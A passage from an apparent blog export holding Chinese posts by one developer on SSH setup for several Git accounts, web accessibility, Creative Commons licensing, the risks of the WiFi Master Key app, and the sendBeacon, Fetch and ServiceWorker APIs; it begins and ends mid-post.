key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_ecdsa-cert type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_ed25519 type -1debug1: key_load_public: No such file or directorydebug1: identity file /Users/barretlee/.ssh/id_ed25519-cert type -1debug1: Enabling compatibility mode for protocol 2.0debug1: Local version string SSH-2.0-OpenSSH_6.9debug1: Remote protocol version 2.0, remote software version libssh-0.7.0debug1: no match: libssh-0.7.0debug1: Authenticating to github.com:22 as 'git'debug1: SSH2_MSG_KEXINIT sentdebug1: SSH2_MSG_KEXINIT receiveddebug1: kex: server-&gt;client chacha20-poly1305@openssh.com &lt;implicit&gt; nonedebug1: kex: client-&gt;server chacha20-poly1305@openssh.com &lt;implicit&gt; nonedebug1: expecting SSH2_MSG_KEX_ECDH_REPLYdebug1: Server host key: ssh-rsa SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8debug1: Host 'github.com' is known and matches the RSA host key.debug1: Found key in /Users/barretlee/.ssh/known_hosts:4Warning: Permanently added the RSA host key for IP address '192.30.252.128' to the list of known hosts.debug1: SSH2_MSG_NEWKEYS sentdebug1: expecting SSH2_MSG_NEWKEYSdebug1: SSH2_MSG_NEWKEYS receiveddebug1: Roaming not allowed by serverdebug1: SSH2_MSG_SERVICE_REQUEST sentdebug1: SSH2_MSG_SERVICE_ACCEPT receiveddebug1: Authentications that can continue: publickeydebug1: Next authentication method: publickeydebug1: Trying private key: /Users/barretlee/.ssh/id_rsadebug1: Trying private key: /Users/barretlee/.ssh/id_dsadebug1: Trying private key: /Users/barretlee/.ssh/id_ecdsadebug1: Trying private key: /Users/barretlee/.ssh/id_ed25519debug1: No more authentication methods to try.Permission denied (publickey). 不加 v 参数，输出的内容很简洁： 123➜ ~ ssh -T git@github.comWarning: Permanently added the RSA host key for IP address '192.30.252.129' to the list of known hosts.Permission denied (publickey). 好吧，我知道你看不懂上面一长串的内容，也没心情看下去，但是你可以把焦点落到重复的那几段： 12345debug1: ...debug1: xxx, No such file or directorydebug1: ...debug1: Trying private key: /Users/barretlee/.ssh/xxxdebug1: ... 之前我们提到了 Protocal Version 1 和 Version 2，不同的版本号，默认的私钥地址不一样，所以程序会不断去尝试寻找默认的地址，如果没找到，最后会提示，授权失败，禁止访问。 我们可以在 push 代码之前，使用 ssh-agent 来管理私钥的 session，如： 1234➜ ~ ssh-add .ssh/coding_barretleeIdentity added: ~/.ssh/coding_barretlee (coding_barretlee)➜ ~ ssh-add .ssh/github_barretleeIdentity added: ~/.ssh/github_barretlee (github_barretlee) 那么当程序寻找私钥的时候，就会优先到 ssh-agent 添加的 session 中寻找。session 的生命周期不是很长，当你重启电脑之后它就没了。如果你有遇到了 Permission Denied 的提示，请重新执行 ssh-add 命令。 当你在某个 Git 服务器上有多个帐号的时候，可能某个帐号总是提示：Permission Denied。拿 coding.net 上来说，我有两个账户，一个是 barretlee，另一个是 taobaofed，由于先前我一直用的 barretlee 账户，后来者 taobaofed 的代码死活推不上去。反反复复地检查配置，反反复复地检查上传的公钥，反反复复地使用 ssh -T git@git.coding.net 测试，没看到哪里不对，然而 taobaofed 的代码就是推不上去，这是怎么回事呢？ 当然，上面 SSH 介绍了那么多，其简明易懂的配置在这里也是可以用上的： 12345678910111213141516171819202122### default for all ##Host * ForwardAgent no ForwardX11 no ForwardX11Trusted yes User nixcraft Port 22 Protocol 2 ServerAliveInterval 60 ServerAliveCountMax 30## barretlee coding ##Host coding-barretlee HostName git.coding.net User barretlee IdentityFile ~/.ssh/coding_barretlee## taobaofed coding ##Host coding-taobaofed HostName git.coding.net User taobaofed IdentityFile ~/.ssh/coding_taobaofed 使用这种配置，我们可以避免使用 ssh-agent 添加 session 操作。可是，我就是按照上面的方式配置的呀，依然不行！ 这里的问题在于，我们的 User 项不正确，每次推送代码的时候，git 会读取上次的的 User 配置，而我的配置是 barretlee，那么下次提交代码的时候虽然 IdentityFile 用对了，但是 User 不是 taobaofed，所以死活也推不动代码。 解决的方案很简单，如果在下载代码之前就已经设置好了两个帐号，你可以通过如下命令克隆代码： 1➜ ~ git clone git@coding-taobaofed:taobaofed/blog.git 如果是在已有的仓库中，其默认 origin 配置会是：//git.coding.net/taobaofed/blog.git 或者 `git@git.coding.net:taobaofed/blog.git，你可以将仓库下的.git/config` 文件修改下： 123[remote &quot;origin&quot;] url = git@coding-taobaofed:taobaofed/blog.git fetch = +refs/heads/*:refs/remotes/origin/* 防止克隆其他仓库代码也出现问题，我们可以将 ~/.ssh/config 稍加修改： 1234567891011## barretlee coding ##Host git.coding.net coding-barretlee HostName git.coding.net User barretlee IdentityFile ~/.ssh/coding_barretlee## taobaofed coding ##Host coding-taobaofed HostName git.coding.net User taobaofed IdentityFile ~/.ssh/coding_taobaofed 那么，通过正常的 clone（如git clone git@git.coding.net:barretlee/blog.git）就不会出现 Permission Denied 的提示了。 需要引起注意的一点：在寻找配置的时候，ssh 会优先查看 ssh-agent session 中的配置，然后才是 config 文件，如果你 ssh-add 添加过 key，建议执行如下操作： 1➜ ~ ssh-add -D # 删除所有的 session 最后撰写本文之前，我已经踩坑三小时，花了三个小时，摸索出来这么些东西，感觉以后妈妈再也不用担心我的 Git/SSH 的配置问题了。 最主要的手段依然是通过 ssh -vT 查看 SSH 交互过程中出现了什么障碍，debug 信息还是很有考究价值的！]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>SSH</tag>
        <tag>GIT</tag>
        <tag>多账户登录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[认识网页无障碍]]></title>
    <url>%2Fblog%2F2016%2F03%2F05%2F2016-03-05-steps-of-web-content-accessibility%2F</url>
    <content type="text"><![CDATA[最近忙里偷闲坚持了好几个星期网页无障碍相关的学习和研究，看了很多文档，也在 Google 中寻觅了不少博客文章，总的来说就一个感受：规范文档太细节太长，博客指导性不强。 在 上文 中提到，信息无障碍并不是一种爱心公益活动，只是在大多数公司中，这方面的技术/产品投入难以带来可观的利润，于是信息无障碍难以进入开发的流程之中，即便有工程师零零碎碎地在页面中加入了无障碍优化，一段时间的产品迭代之后，这些优化又荡然无存了。 我希望，通过一段时间的研究和实践，能够把我对网页无障碍化的理解表达出来，在学习的过程中，会去盲人社区交流，切身体会视障人士的处境，同时也会跟国内几位做了比较长时间网页无障碍研究的盲人开发者沟通，收获一些心得。 认识网页无障碍化站在一个用户的角度思考。当用户进入你的网站，他的目的应该是很明确的，在最短的时间内通过最快的方式找到自己想要的信息。正常人通过眼睛去捕捉网页上的信息，而视障人士主要通过耳朵，并使用读屏软件辅助读取页面的信息。 如果网页很长，链接很多，比如一些门户网站，盲人用起来就会特别吃力，PC 上通过 TAB 键从头开始往后聚焦，成千上万个链接堆叠在一坨，其恶心程度可以想象，我觉得能够鼓起勇气进入这些网站的盲人都是脾气相当不错的（如果是你，你会砸键盘么🙈）。 读屏软件不知道哪些信息是「重要信息」和「次要信息」，更加不清楚哪些信息是重复信息，有的时候读屏软件还会读到一些干扰信息（比如图形字符等）。 所谓的网页无障碍化，就是将网页信息有序的排列在一起，并且提供几个快捷入口让用户迅速找到关注点，然后排除干扰，我简单地理了下无障碍化的思路： 第一步，让用户知道页面上有什么内容，比如使用 HTML5 的语义化标签以及 WAI-ARIA 中的 landmark 地标； 第二步，让用户可以轻松在页面的板块之间切换，比如添加快捷键支持； 第三步，让用户知道哪些是主要部分，甚至在进入页面的时候就提供快捷方式跳到主要内容的锚点； 第四步，去除页面干扰，如 iconfont 文字，相邻重复的链接等； 第五步，提供页面的交互支持，让自定义的组件如 tab、slide 都具备无障碍属性。 稍微厘清上面五个步骤的思路，其实很简单，就是让信息模块化地呈现，这样就可以让耳朵更好的代替眼睛办事儿。 理解和实践网页无障碍化掌握了整体的思路后就会清楚，哪些操作是有益于网页整体无障碍的，哪些操作是局部的微小优化，对于很多网站而言，我们可能不需要去关注细微的优化，因为这些事情读屏软件可以胜任。只要能够在整体上将一个网页乃至一个网站的无障碍体验做好，这就是网页无障碍化的最佳实践！ 有些同学在做无障碍实践的时候没有真实理解盲人的需求，所以做出来的东西反而比没优化之前更加难用，比如滥用 tabindex，把网页内容的顺序排列得支离破碎，如果你正在做或者正准备做网页无障碍，请你一定要站在盲人的角度看问题。当然，最好你还能闭上眼睛拿着读屏软件测试下你写的页面。 不同的平台会有不同的读屏软件，由于各读屏软件对标准的实现存在偏差，甚至存在删减，最后导致不同平台下的读屏体验是不一样的，如同我们关注各浏览器之间的兼容性一般，在做无障碍测试的时候，也要关注不同读屏软件的差异。 最后文本主要从网页无障碍的思路上做了一些阐述，可能不严谨，也可能有表述不当的地方，如果你对这方面有研究，欢迎提出你的观点，也期待更多人关注网页无障碍化。]]></content>
      <categories>
        <category>网页无障碍</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>网页无障碍</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息无障碍不是献爱心更不是做公益慈善]]></title>
    <url>%2Fblog%2F2016%2F02%2F28%2F2016-02-28-step-in-aria%2F</url>
    <content type="text"><![CDATA[自从两年前加入阿里巴巴的信息无障碍小组，平时的学习当中就多了一项内容，关注信息无障碍相关的文章，也经常去 W3C 上看看技术文档。 由于今年把无障碍相关的学习研究提高了一个优先级，每逢周末就会去网上搜寻下相关的文章，也因此认识了一些盲人朋友。 很多人以为盲人就是拿着一根拐杖，四处探路，等着被人帮助。你可能还不知道，很多盲人都在使用电脑和手机，并且也会做股票投资、在淘宝开店等，当然，他们用的很痛苦。技术本可以让视障人士同我们一样，自由穿梭在互联网的每个角落，但互联网的搭建者们，似乎还没有意识到，有一个群体，期待被我们关注，期待我们把信息无障碍植入到网络中。 我转了几段几位视障朋友人说过的话： 顾伶磊： 在中国，互联网产品的无障碍化还非常遥远，没有几个人能真正理解无障碍化的含义。当你还把无障碍当成一项爱心事业在做的时候，你就已经注定失败了。 无障碍可用性本应该是一项规范，而不是一向爱心事业。如果你把他当成爱心事业去做，是注定不会长久的。在此我们呼吁，各大互联网企业和产品开发们，能帮忙推动无障碍的规范化，将无障碍可用性列入产品开发的规范中。 东东保2011： 现在很多企业把作无障碍看成是一种施舍，而并非是一种规范和义务。 史明明-百年孤独： 做无障碍不该被当成是做工艺、慈善、施舍，相信无障碍的相关法律法规一定会出台。 黄龙小生： 其实，无障碍它体现了人与人之间的平等，无障碍之所以有障碍表面乃是程序和工作问题，往深了说却是人性不平等的一面在作怪。在我们天朝大家认为做了这事情乃是公益事业乃是行善事，可是在人家那里，这些本来就是日常工作中的一部分而已。残障人身有残障，可是在这里却变得智有残障了。 以及一位 盲人技术开发者 的观点： 信息无障碍的目的在于让所有人包括残障人、老年人、儿童等都可以很方便的平等的获取信息。目前国内的现状是人们普遍缺乏对无障碍的理解和认识，同时也缺少有效的法律支持。很长一段时间内最主要的工作是普及无障碍意识。推动信息无障碍是个长期的持续的工作。现在大多数的信息障碍来源于信息提供者。互联网信息障碍主要来自于网站和软件的开发者。这几年来，我一直与软件开发者交流，最大的感触是，他们是有爱心的，是愿意做无障碍工作的，唯一缺乏的是无障碍意识，他们不知道他们的产品会给残障人带来麻烦。而一旦他们了解到这些障碍之后，都是很愿意进行改进的。所以，普及无障碍意识，从开发者入手是最直接、最有效的方式。 无障碍技术并没有很难，只是我们没把这件事当回事。后续我会发布一些信息无障碍相关的技术研究文章，希望可以带动一部分人一起做这件事情。]]></content>
      <categories>
        <category>网页无障碍</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>信息无障碍</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈一谈博客的著作版权问题]]></title>
    <url>%2Fblog%2F2016%2F02%2F27%2F2016-02-27-about-cc%2F</url>
    <content type="text"><![CDATA[古人对「著作」和「编述」两个词的含义区分的比较明显，子曰：“述而不作，信而好古”，意思是，只负责传承古代的优秀文化，不搞改革，相信并且喜欢玩味古代的东西。那个时代产出的知识体量小，而现在不一样，信息时代，很多内容都是在沉淀的知识中做微创新、微著作。 如果要把博客文章划进这两个词，著作或许更加适合些。我们在博客中的论述，稍微有点含量的，都可以称之为著作。 在中国，盗版应该是一个深入骨髓的词语，如果哪天发现身边的朋友没有使用盗版的软件、看盗版的数据、听盗版的音乐，你可能会乜斜着眼睛诧异的盯着这个人（心里默念着土豪）。近两年，国家在盗版的打击上做了大量工作，尤其是书籍和音乐两块。 最近看到技术圈的内容聚合平台如雨后春笋般崛起，然而有极少数的朋友在分享的时候并不太在意版权的问题。所以今天想把这个问题再提到纸面上说说，加深大家的印象。 大众没有版权保护的意识近几年，国内出现了好几个支持静态部署的平台，加之技术学习门槛越来越低，很多人都玩起了博客。我平时也喜欢看别人写的东西，每每 Google 搜索都会掉进几个不错的博客，看到有意思的内容，便会削一个苹果坐在一旁，边吃边看🙈。 大约有一半的朋友会在自己的文章中备注版权信息，告诉路人，文章可以拿走，但是要记得带上名字和原文链接，这个习惯很好。可是也有很多朋友并没有意识到这个问题。前段看到团队号召各位攻城师把工作上不错的想法提炼成专利，并对我们做了相关的知识普及，我发现，很多专利其实并不需要什么高深的技术。其实著作也是类似的，用心去写，搞不好你某篇文章就可以给你带来一些正向影响。 以前的著作，权限控制很极端，一种是不给任何权利，一种是把所有权利都给出去。你是否也经常看到 Apache 协议、MIT 协议等等对代码开源的权利控制？我之前整理了一份文档，感兴趣的可以看看：《五种开源协议的比较(BSD,Apache,GPL,LGPL,MIT)》，适当对著作权做保留，一方面有利于将自己的知识成果分享出去，另一方面也是对自己权益的维护。 Creative Commons博客文章写作一般会用到 Creative Commons 相关协议，中文叫做「知识共享协议」，简称 CC。对权利的归类分为四种： 署名（Attribution，简写为 BY）：必须提到原作者。 非商业用途（Noncommercial，简写为 NC）：不得用于盈利性目的。 禁止演绎（No Derivative Works，简写为 ND）：不得修改原作品, 不得再创作。 相同方式共享（Share Alike，简写为 SA）：允许修改原作品，但必须使用相同的许可证发布。 使用时，可以对以上随机组合，用的比较多的组合有这么几个： 署名-非商业性使用-相同方式共享 2.5 中国大陆 (CC BY-NC-SA 2.5 CN) 署名-非商业性使用-禁止演绎 3.0 中国大陆 (CC BY-NC-ND 3.0 CN) 署名-相同方式共享 4.0 国际 (CC BY-SA 4.0) 我的博客使用上面第二种协议，可以在任何媒介以任何形式复制、发行博客作品，但是要保留署名，不允许商用，不能对内容进行修改和再创作。还算比较宽松，对一般的聚合平台而言，在醒目位置留下作者名字和原文链接即可。 不止于协议大家都知道，技术内容是在不断革新的，上半年还在流行的东西，下半年可能就已经淹没在历史洪流之中。博客文章中的表述可能存在诸多错误或者一段时间后内容过时了，当作者发现这些错误的时候，便会对内容做修改，copy 方式的转载最大的问题就是没法即时与原文保持同步，倘若转载时还不保留原文地址，信息的传递就会出现断层，一些错误的表述和内容，容易对刚入门的新人造成负面的刻板印象，这一点是需要各位朋友在转载文章的时候注意的！ 好吧，说了这么多，就当我啰嗦了下。]]></content>
      <categories>
        <category>随笔</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>Creative Commons</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WiFi 万能钥匙原理和危害探究]]></title>
    <url>%2Fblog%2F2016%2F02%2F23%2F2016-02-23-wifi-key%2F</url>
    <content type="text"><![CDATA[本文不会从代码角度分析 WiFi 万能钥匙这个软件是如何「破解」密码的，主要从使用这个软件后的感受出发，分析它可能会用到的手段以及可能存在的风险。 以前因为好奇，安装了 WiFi 万能钥匙，但是从来没有打开过，当时我心里很清楚，蹭网的前提就是自己家被蹭。晚上刷微博看到一张图片，iphone 设备的 WiFi 列表中竟然出现了「🔑一键免费连接🔑」相关的提示，我用自己的手机测试了下，果真如此： 软件对 WiFi 密码的攫取获取安装该软件用户连接过的 WiFi 的密码，这是 WiFi 万能钥匙需要攻克的第一个难题，攻克之后，从一个用户身上可以挖到 1-10 个 WiFi id 和 WiFi 密码。攻克的方式嘛，可以去网上搜罗下，很多保存下来的密码都是明文的，或者是只经过了简单的加密操作，如果用户 root 了自己的手机，软件可以随意获取。 显然，WiFi 万能钥匙有一个自己的云端，储存了大量从用户手机里攫取到的 WiFi 信息，每个储存单元应该包含了如下信息（按照重要性从上往下依次排列）： WiFi 容器的物理地址（MAC 信息） WiFi 的密码 WiFi 名称 WiFi 容器的区域信息 WiFi 容器的 IP 地址 由于民众对快速上网的极度渴望，偶然听到或者看到有这么个神器，当机立断将其下载到了手机上，在这两年时间间，该软件的用户量达到了 5 亿之多，月活跃用户在 2.3 亿（数据来自网络），其用户量之多、粘性之强，恐怕只有社交类的软件可以比拟了。由此，也可以想象 WiFi 万能钥匙的云端数据库有多么庞大。 WiFi 的连接初次打开软件的时候，你应该看到了它会向你申请「获取位置信息」的请求，目的有两个，第一是获取你所在区域的大概位置，然后将该位置附近的 WiFi 信息全部缓存到你的客户端，这样做可以大大地减少对服务器的压力，其二，目前 WiFi 万能钥匙也会做一些商品/商家的推广，拿到位置信息方便个性化投放。 1. 密码匹配 以前手机没有提供权限给它获取 WiFi 列表，所以软件会引导用户将 WiFi 列表界面截图，然后通过图片分析拿到 WiFi 名称。而如今，iOS 设备不仅提供了获取周边 WiFi 列表的权限，而且还允许软件对每个 WiFi 进行文字备注，如最上面破解效果列表图所示。 所以我猜测，以前软件只能通过 WiFi 名称进行匹配，而现在可以使用 WiFi 的其他信息如（MAC 地址）进行匹配，匹配度更高，因为 WiFi 名称可能会存在重复问题。 2. 撞库分析 拿到了几个亿的数据，自然少不了对数据进行统计和分析，拿到一些常用的弱口令，如八个8、四个123、八个0等，了解路由设置和 WiFi 设置的人本来就不多，很多上门服务的师傅一般就将密码设置成简单好记的，这也很大程度提高了撞库的成功率。对于拿不到密码的 WiFi，软件毫无疑问会作出这种尝试，成本低、成功率还高。 3. 暴力破解 暴破应该不会用于实时的密码获取，而是会在沉默状态下，对未知 WiFi 进行暴力破解，破解成功的 WiFi 上传到云端服务器。这种方式可能在软件上线的初期使用，只是我的一种猜测。 被蹭网存在的危害如果家里的网络被小白用户蹭了，无非就是大家同时上网的时候，网速会慢一点，而如果你家网络被一个具备黑客素质的人蹭上了，这个时候可能需要引起注意了。 如果你家里有 WiFi，那么一定会有一个路由器吧，路由器的密码还是初始状态的 guest/admin 么，或者被你设置成了六个8？如果我是这个攻击者，一定会想各种办法拿到你们家路由器的密码，如果运气好进去了，下一步要做的事情就是把路由器的网关设置成我自己的电脑，然后各种截获和注入。 如果没有攻克路由器，也可以利用在一个局域网内的条件，通过共享、网络广播等各种欺骗手段忽悠小白用户上当，方法总是很多的。只要打开一个口子，基本上你的手机/电脑就被控制了，投毒、欺骗、诱骗等，能用上的都会用上。 如何防止被蹭你手机上没有安装 WiFi 万能钥匙，也没有将密码告诉旁边的邻居、路人，结果发现自己的网络还是被蹭到了。为啥呢？回想下，原来上个月你家外甥过来了，然后他手机上有这个软件… 防止被蹭的最好的方式就是，密码不告诉任何人，即便是外甥。现在的路由器默认可以设置两个 WiFi，并且可以对 sub-WiFi 进行流量限制。当然，有些 WiFi 做的比较成熟，可以通过自己的手机监控连接的设备，然后设置白名单和黑名单。不过估计用这种 WiFi 的人不会很多，一般的 WiFi 也支持在 Web 界面上控制上网设备。 还有一种方式是，在路由器中，将无线设置的 SSID 广播改为「隐藏」，周边设备就没办法找到你家的 WiFi 网络了。 常规的 WiFi 热点设置原理分享一段跑题的内容。 以前使用 Window/Linux 系统的时候，尝试过将自己的电脑作为热点把网络分享给其他同学，刚开始使用了叫做 猎豹WiFi 的软件，后来自己也开始敲代码折腾，事实上，在 window 下一行代码就能产生一个无线热点： 1netsh wlan set myWiFi mode=allow ssid=YOUR_WiFi_NAME key=WiFi_PASSWORD 上述命令会在系统的某个位置生成一个文件，其中 key 是明文保存的，然后通过如下命令就能开启 WiFi： 1234# 开启 WiFinet wlan start myWiFi # 关闭 WiFinet wlan stop myWiFi Linux 下稍微费劲些，配合 hostpd 和 dnsmasq，不过也是差不多几行代码的事情。 最后本文主要是对 WiFi 万能钥匙这个软件相关功能的一些猜测，具体如何实现，可以去网上观摩下骇客们对软件代码的反编译。]]></content>
      <categories>
        <category>网络交互</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>WiFi万能钥匙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[页面跳转时，统计数据丢失问题探讨]]></title>
    <url>%2Fblog%2F2016%2F02%2F20%2F2016-02-20-navigator-beacon-api%2F</url>
    <content type="text"><![CDATA[为了更好地了解用户对产品的使用情况，业务中，我们经常会收到埋点统计的需求，比如： 收集一段时间内用户光标在页面中的运动情况，包括光标移动、点击等行为 统计用户滚屏行为 统计用户在站点的停留时长 收集页面链接的点击数量等 无论是移动端还是 PC 端，相信很多朋友都遇到了这么几个十分让人头疼的问题： 统计某个链接的点击量，但是这个链接点击后直接跳转走了 统计页面时长问题，unload 的时候发送的统计丢失了 统计脚本还没有初始化，用户不感兴趣已经走人了等 如果我们把这样的数据交给了产品同学，可能会让他们对用户行为产生错误的认知，一定程度上影响产品的下一步改善。 传统解决方案上面提到的问题，从技术角度可以归纳为两点： 用户关闭页面过早，统计脚本还未加载/初始化完成 用户关闭或者跳出页面的时候，请求未发出 针对第一点，概率较小，一般的处理方式就是，不要把统计脚本参合到其他脚本中，单独加载，并且放在前头，让它优先加载。很多公司的做法是，不让开发者关心统计脚本的加载，用户请求页面的时候，Nginx 会在 Body 开始标签位置注入一段脚本。 对于问题二，处理方案就有很多了。 1. 阻塞式的 Ajax 请求 还记得 XMLHttpRequest::open 方法的第三个参数吧，如果设置为 false 就是同步加载， 123456window.addEventListener('unload', function(event) &#123; var xhr = new XMLHttpRequest(), xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8"); xhr.open('post', '/log', false); // 同步请求 xhr.send(data);&#125;); 阻塞页面关闭，当然可以在 readState 为 2 的时候就 abort 请求，因为我们不关心响应的内容，只要请求发出去就行了。 2. 暴力的死循环 原理跟上面类似，只不过是使用一个空的死循环阻塞页面关闭， 12345window.addEventListener('unload', function(event) &#123; send(data); var now = +new Date; while(new Date - now &gt;= 10) &#123;&#125; // 阻塞 10ms&#125;); 3. 发一个图片请求阻塞 大部分浏览器都会等待图片的加载，趁这个机会把统计数据发送出去 1234window.addEventListener('unload', function(event) &#123; send(data); (new Image).src = 'http://example.com/s.gif';&#125;); 以上提到的几个方案都是一个原理，让浏览器继续保持阻塞状态，等数据发送出去后再跳转，这里存在的问题是： 少量浏览器下可能不奏效 等待一会儿再跳转，用户体验上打了折扣，尤其是移动端上 是否有更好的方案解决这个问题呢，前端同学秉着「小强精神」也提出了两个可实践的方案。 优化方案不就是埋点统计数据嘛，非得在当前页面发送出去？优化方案的思路具有一定的跳跃性，我们考虑将数据在下跳页中发送，那么问题就转换为，如何将数据传递给下跳页？ 对于链接点击量的统计，我们可以将链接信息通过 url 传递给下跳页，传递思路如下： 1. url 传参 通过数组标识一个链接的位置信息，如 [站点id，页面id，模块id，链接index]，通过四个参数可以惟一标识链接位置属性，使用 URL param 参数将数组数据传递给下跳页，等待由下跳页将数据发送出去。 这里存在的问题是，下跳页中必须部署同样的统计脚本，但对一个系统来说，这是很容易做到的。我们也不会在自己的网页上放其他网站的链接吧，所以整个数据的统计都在一个闭环内。 2. 通过 window.name 传递数据 window.name 是浏览器给我们开放的一个接口，设置该属性的值后，即便页面发生了跳转，这个值依然不会变化，并且可以跨域使用。 这里存在的问题是，该属性可能被开发者用于其他途径。我们可以限制开发者直接使用 window.name，封装接口，通过接口调用，如 aralejs 提供的 nameStorage， 123nameStorage.setItem(key, value);nameStorage.getItem(key);nameStorage.removeItem(key); 储存形式为： 1234567 scheme nameStorage datas | |------------ ------------------------nameStorage:origin-name?key1=value1&amp;key2=value2 ----------- | window origin name 以上虽然基本解决了数据丢失和体验差的问题，但是这也很大程度依赖于开发者的编程习惯，如不能随便玩耍 window.name；也对系统有一定的要求，必须在所有页面上部署同样的埋点脚本。 这件事情应该交给浏览器来解决上面提到的各种方案，不乏黑科技，然而存在的问题还是一大堆，如果团队的开发者执行力不够，中途容易出现各种麻烦。所以真正能够解决这个问题的，必然还是浏览器本身！ 为什么不能给用户提供这样一个 API，即使页面跳转了，也能够将上个页面的请求发出去呢？庆幸的是，W3C 工作组也想到了这个问题，提出了 Beacon API 的 草案。 Beacon API 允许开发者发送少量错误分析和上报的信息，它的特点很明显： 在空闲的时候异步发送统计，不影响页面诸如 JS、CSS Animation 等执行 即使页面在 unload 状态下，也会异步发送统计，不影响页面过渡/跳转到下跳页 能够被客户端优化发送，尤其在 Mobile 环境下，可以将 Beacon 请求合并到其他请求上，一同处理 sendBeacon 函数挂在在 navigator 上，在 unload 之前，这个函数一定是被初始化了的。其使用方式为： 123window.addEventListener('unload', function(event) &#123; navigator.sendBeacon('/collector', data);&#125;); navigator.sendBeacon(url, data);，第一个参数为数据上报的地址，第二个参数为要发送的数据，支持的数据格式有：ArrayBufferView, Blob, DOMString, 和 FormData。 Beacon 的还有一个非常实用的移动端使用场景，当用户从浏览器切换到其他 app 界面或者 Home 屏的时候，部分浏览器默认会停止页面脚本的执行，如果在这个时候使用了 unload 时间，可能会让你失望，因为 unload 事件并不会触发，此时，Beacon 就派上用途了，它是不会受影响的。 最后本文是对页面打点丢失问题的简单探讨，枚举了我们通常会用到的一些解决方案，可能不是很完善，如果你有更好的建议，可以提出来。 很多问题，我们绞尽脑汁，可能很少会考虑，这个问题是不是应该有我们来解决，或者说这个问题交给谁处理是最恰当的。本文的探讨可以看到，浏览器本身才是最好的问题解决方，当网站流量变大之后，上面提到的丢失问题就更加明显，这也迫使浏览器本身做了改善，自然也在情理之中。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络交互</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Beacon API</tag>
        <tag>navigator.sendBeacon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[当前端也拥有 Server 的能力]]></title>
    <url>%2Fblog%2F2016%2F02%2F16%2F2016-02-16-when-fe-has-the-power-of-server%2F</url>
    <content type="text"><![CDATA[今天看了不少文章，比较感兴趣的是 Cache API。它是浏览器 Request/Response 的缓存管理工具，其使用风格和运用场景让我瞬间联想到了 ServiceWorker 和 Fetch API，相信很多同学也多次看到过这两个东西，本文会对它们做一个简洁的介绍，并谈一谈我对这些新玩具的看法。 Fetch API传统的 XMLHttpRequest，出了两个版本，在 XHR2.0 中引入了跨源请求、上传进度事件和对二进制数据的支持等，这些 API 的增强让 AJAX 可以很方便地与 HTML5 API 相结合，例如 File System API、Web Audio API、WebGL 等，让前端对音视频的处理和富客户端元素的处理更加有亲和力。 作为一个与后端交互的通道，XHR2.0 的接口封装依然过于底层。看看 jQuery 对 AJAX 的封装，再回头看看我们今天要介绍的 Fetch API，不得不惊叹，浏览器已经在应用层面思考着功能的拓展，依托着 Promise 产出了十分友好的新一套接口。 以前我们使用 XHR 去请求一个资源，会这么做： 12345678910111213141516171819// Just getting XHR is a mess!if (window.XMLHttpRequest) &#123; request = new XMLHttpRequest();&#125; else if (window.ActiveXObject) &#123; try &#123; request = new ActiveXObject('Msxml2.XMLHTTP'); &#125; catch (e) &#123; try &#123; request = new ActiveXObject('Microsoft.XMLHTTP'); &#125; catch (e) &#123;&#125; &#125;&#125;request.onreadstatechange = function()&#123; // handle data;&#125;;request.open('GET', 'http://barretlee.com/test.json', true);request.send(null); 而使用 Fetch API，我们只需要： 123456fetch('http://barretlee.com/test.json').then(function(response) &#123; // Convert to JSON return response.json();&#125;).then(function(val) &#123; console.log(val); &#125;); 对于 Text/HTML 和 Blob 等格式的请求和转化也是异常方便： 12345678910111213// Text/HTML 请求fetch('/next/page').then(function(response) &#123; return response.text();&#125;).then(function(text) &#123; console.log(text); &#125;);// Blob 流fetch('flowers.jpg').then(function(response) &#123; return response.blob();&#125;).then(function(blob) &#123; document.querySelector('img').src = URL.createObjectURL(blob);&#125;); Fetch API 让我们更加关注请求和响应之间的交互，而不是聚焦在如何请求和如何处理响应两个问题上。 当然，它也存在几个相比 XHR 不足的地方，首先它不能 abort 请求，同时也不能获取请求过程中的 progress 状态，当然也没有 timeout 超时处理。Fetch API 是基于 Promise 的，而 Promise 的状态只有 pending、resolve、reject，不会出现诸如 pending(80%) 的状态提示；我们也无法对一个 Promise chains 做 abort 处理，这些都是能够理解并且接受的。 我也相信，Fetch API 有能力提供这些状态信息和附加的 API，只是在这个不成熟的环境下，它目前不需要迈这么大的步子。 ServiceWorkerServiceWorker，简单而言就是一个放在前端的 HTTP 拦截器，比如我们要请求一个不存在的 URI 如：/test/a.html，直接请求就会响应 404，而如果我们预先在 ServiceWorker 中注册了这个地址，并且指定响应内容，当再次请求时，你会看到结果是存在的，举个例子： 123456789101112&lt;!-- demo.html --&gt;&lt;script&gt;navigator.serviceWorker.register("worker.js", &#123; scope: "/test/a.html"&#125;).then(function()&#123; fetch(‘/test/a.html’).then(function(response) &#123; return response.text(); &#125;).then(function(text) &#123; console.log(text); &#125;);&#125;);&lt;/script&gt; 在 demo.html 文件中，我们看到，将 /test/a.html 的请求交给 worker.js 来处理，处理方式为： 1234// workker.jsaddEventListener("fetch", function(evt) &#123; evt.respondWith(new Response(“Hi, Barret Lee”));&#125;); 在 demo.html 的回调中使用 Fetch 获取/test/a.html 这个并不存在的内容，被 ServiceWorker 捕获，交给 worker.js 处理并响应 Hi, Barret Lee 的文本，整个设计思路十分清晰，很轻松地拦截了来自客户端的请求，并作出了响应。 由于 ServiceWorker 是对 Promise 友好的，响应时也可以模拟服务器休眠状态： 1234567addEventListener("fetch", function(evt) &#123; evt.respondWith(new Promise(function(resolve, reject)&#123; setTimeout(function()&#123; resolve(new Response(“Hi, 